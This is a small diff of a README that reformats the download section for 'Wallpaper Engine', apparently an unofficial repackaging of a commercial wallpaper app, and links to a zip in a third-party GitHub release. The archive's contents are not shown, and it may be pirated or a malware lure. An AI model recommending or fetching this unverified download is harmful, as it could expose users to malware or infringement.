@@ -22,9 +22,9 @@
 - Easy wallpaper management
 
 ---
-## 📥 Download
-📥 [`WallpaperEngine.zip`](https://github.com/PHjont/Wallpaper-Engine-Live-wallpaper-engine/releases/download/LiveWallpaper/WallpaperEngine.zip)
-
+##  Download
+ [Download `WallpaperEngine.zip`](https://github.com/PHjont/Wallpaper-Engine-Live-wallpaper-engine/releases/download/LiveWallpaper/WallpaperEngine.zip)
+--
 > ℹ️ Optimized for Windows 10 and Windows 11. Best performance with dedicated GPU.
 
 ---
